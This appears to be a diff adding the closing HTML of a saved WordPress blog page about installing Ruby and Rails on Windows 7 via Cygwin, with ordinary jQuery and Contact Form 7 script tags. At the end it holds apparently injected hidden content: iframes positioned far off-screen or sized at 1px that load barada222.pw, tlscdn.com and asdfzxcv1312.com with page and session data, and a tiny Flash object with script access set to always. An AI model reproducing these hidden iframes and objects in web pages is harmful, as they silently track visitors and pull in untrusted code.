+<![endif]-->
+<script data-rocketoptimized="true" type="text/rocketscript">
+// Load MeanMenu
+jQuery(document).ready(function() {  
+	jQuery('header nav').meanmenu({ meanRevealPosition: "center", meanScreenWidth: 767 });
+});
+</script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-content/plugins/contact-form-7/includes/js/jquery.form.min.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript">
+/* <![CDATA[ */
+var _wpcf7 = {"loaderUrl":"http:\/\/collaborate.je\/wp-content\/plugins\/contact-form-7\/images\/ajax-loader.gif","recaptchaEmpty":"Please verify that you are not a robot.","sending":"Sending ...","cached":"1"};
+/* ]]> */
+</script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-content/plugins/contact-form-7/includes/js/scripts.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-content/themes/wharton/assets/js/plugins/jquery.jplayer.min.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-content/themes/wharton/assets/js/plugins/jquery.flexslider-min.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-content/themes/wharton/assets/js/plugins/jquery.meanmenu.min.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-content/themes/wharton/assets/js/scripts.min.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-includes/js/wp-embed.min.js?4f8480"></script>
+<script data-rocketoptimized="true" type="text/rocketscript" data-rocketsrc="http://collaborate.je/wp-includes/js/comment-reply.min.js?4f8480"></script>
+
+
+ <a href="http://www.pinterest.com/pin/create/extension/" style="height: 20px; width: 40px; position: absolute; opacity: 0.85; z-index: 8675309; display: none; cursor: pointer; border: medium none; background-color: transparent; background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAUCAYAAAD/Rn+7AAADU0lEQVR42s2WXUhTYRjHz0VEVPRFUGmtVEaFUZFhHxBhsotCU5JwBWEf1EWEEVHQx4UfFWYkFa2biPJiXbUta33OXFtuUXMzJ4bK3Nqay7m5NeZq6h/tPQ+xU20zugjOxR/+7/O8539+5znnwMtNTExwJtMb3L/fiLv3botCSmUjeCaejTOb39AiFothfHxcFIrHY8RksZjBsckJcOIRMfFsHD/SsbExUYpnI8DR0dGUGjSb0byhEJp5Uqg5CTSzc2CQleJbMEj9/ywBcGRkJEk9DQqouEVQT1sK444yWI9UonmTjGqauVLEIlHa9x8lAMbj8SSpp0rwKGMVvg8P46vbg0C7na8z8JsMcgHe7jlEa+edRhiLy8n/TUMfu6EvLElk+U0WtGwrTrdfAGQf5J8iiK4LVzDU28t8JtMSocf8E+l68myaNFXm/6rXslLK7ay5TOunuRvZWpJuvwAYjUaTpOIWoquuAZ219RTaxKYp9BbjycoN5FvL9qH9TBX5rvoGdJythvXYSTxdtRnWylO/ZdqrLsGwszzhWQ593z2KlAwCYCQSSZJ6ehZ0W7bD9VBLgN0NCqr3qR7R2rBrL3pu3Sb/7nDlz2uy6cG0OXk0GTbZXzNp8trsPAQdTj6frlWzN2DcXZGKQQAMh8NJ6rpyHe+PnkCr/CAFdZyvpfpjuvkifLF9wIt1Wwlo0OHie1RvWrKa93RjzfzliTzPKz3ltB0/Tevmwp14wGUgHAzSOoUEwFAolFaaBSuhnslPRkJexUJtZ6v5HtUeLswl33n1BgEY5fvhs9sJ3FAiT+QYyyvoAQJuD0KBAFRTJNAuz5/s3gJgMBhMJwrVFRThM5tY5zUF/A4X1f2fvQTRLCuBreoim0YmAbqNJryvPEXeeq46kaNdkQ/1HCncbJKPs9ZSv2VHGfWsZ2hfkhKAfr8/pdxWKx4wwD69PmVfNSOL+lr2w+gYqHpWDtXt1xQ8AMlWU0e1lqLd/APRHoP8AJqWrQG9gYxcPMsvSJUvAA4MDKTUJ7MZLaVy8v+qT21tcDx/OemePr0RTkNrur4A6PP5xCgBsL+/X4wiQDpuuVxOeL1eMYmYeDY6sOp0z+B0OuHxeEQhxkJMFosJiSO/UinOI/8Pc+l7KKArAT8AAAAASUVORK5CYII=&quot;);"></a><div><div style="position:absolute;z-index:1000;top:-1000px;left:-9999px;"><iframe src="http://js.barada222.pw/?id=6947627&amp;keyword=1938744&amp;ad_id=Xn5be4"></iframe></div></div><script charset="UTF-8" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/javascript_002.js" async=""></script><script charset="UTF-8" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/javascript.js" async=""></script><iframe src="https://foxi69.tlscdn.com/altHbHandler.html#opdom=mgicinjs.info&amp;partner=mgicin&amp;channel=mgicin&amp;country=US&amp;quick=https%3A%2F%2Fendall41-q.apollocdn.com%2F&amp;trinity=Z10r4o695s2o&amp;instgrp=&amp;referrer=&amp;hid=0&amp;sset=2&amp;pageurl=http%3A%2F%2Fcollaborate.je%2F2014%2F08%2Fsetting-ruby-rails-windows-7-via-cygwin%2F" scrolling="no" border="no" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" id="hb1456461725661" class="hb1456461725661" frameborder="0"></iframe><iframe style="width: 0;  height: 0;  position: absolute;  top: -10031px;  left:-1000000px;" scrolling="no" border="no" overflow="hidden" visibility="visible" src="http://f.asdfzxcv1312.com/idle.html#B3bKB209BwDPy2LUANmUAw5MBYzWyxj0BMvYpw1NAwnPBIzJAgfUBMvSpw1NAwnPBIzJB3vUDhj5pvvtjMn1CNjLBNrKB21HAw49yxnKzNP4y3yXmZeYlMnVBsz0CMLUAxr5pvOXmhi0BZy5nxmYBYzPBNn0z3jWpszZzxnZAw9UAwq9mtq1nJq2mtCYntKWmdu0ntuMAgLKptaMCgfNzxvYBd1ODhrWjtnbjtjgjtjgy29SBgfIB3jHDguUAMuLmKyYmde0jtjgmdGLmKzZzxr0Aw5Nlxj1yNKTCMfPBhmTD2LUzg93CY03lxzPys1JEwD3Aw4LmKy=" id="asdfad" frameborder="0"></iframe><div style="position: absolute; width: 1px; height: 1px;" id="dp_swf_engine"><object style="width: 1px; height: 1px;" id="_dp_swf_engine" data="http://www.ajaxcdn.org/swf.swf" type="application/x-shockwave-flash" height="1" width="1"><param value="always" name="allowscriptaccess"></object></div><iframe src="https://foxi69.tlscdn.com/mailer.html#opdom=mgicinjs.info&amp;partner=mgicin&amp;channel=mgicin&amp;country=US&amp;quick=https%3A%2F%2Fendall41-q.apollocdn.com%2F&amp;domain=collaborate.je&amp;trinity=Z10r4o695s2o&amp;instgrp=&amp;referrer=&amp;sessionid=14564617259005455&amp;hid=0&amp;sset=2&amp;test=1&amp;pageurl=http%3A%2F%2Fcollaborate.je%2F2014%2F08%2Fsetting-ruby-rails-windows-7-via-cygwin%2F" scrolling="no" border="no" style="width: 1px; height: 1px; position: absolute; top: -100000px; left: -100000px; visibility: visible; overflow: hidden;" id="mailer1456461725949" class="mailer1456461725949" frameborder="0"></iframe></body><script type="application/x-javascript" src="Setting%20up%20Ruby%20%28and%20Rails%29%20on%20Windows%207%20via%20Cygwin%20-%20collaborate.je_files/opt_content.js"></script></html>
